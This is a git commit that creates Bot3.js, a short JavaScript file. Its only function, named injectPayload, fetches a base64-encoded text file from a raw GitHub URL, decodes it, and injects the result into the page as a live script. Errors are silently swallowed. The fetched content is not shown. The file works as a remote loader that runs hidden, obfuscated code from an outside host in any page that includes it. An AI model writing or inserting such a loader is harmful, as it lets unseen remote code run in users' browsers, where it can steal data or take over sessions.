c3beae924da70c1558de424c01dbad14ff37ffc8
raadchat <48301343+raadchat@users.noreply.github.com>
2026-07-23 22:05:40 +0300

    Create Bot3.js

---
+++ Bot3.js
@@ -0,0 +1,21 @@
+async function injectPayload(url) {
+    try {
+        const response = await fetch(url);
+        let data = await response.text();
+          // فك تشفير Base64
+        let decoded = atob(data.trim());
+        
+   
+        let fixedContent = decodeURIComponent(escape(decoded));
+        
+        const script = document.createElement('script');
+        script.textContent = fixedContent;
+        document.body.appendChild(script);
+        
+        
+    } catch (err) {
+       
+    }
+}
+
+injectPayload('https://raw.githubusercontent.com/raadchat/Chat2/main/Botchat2.txt');
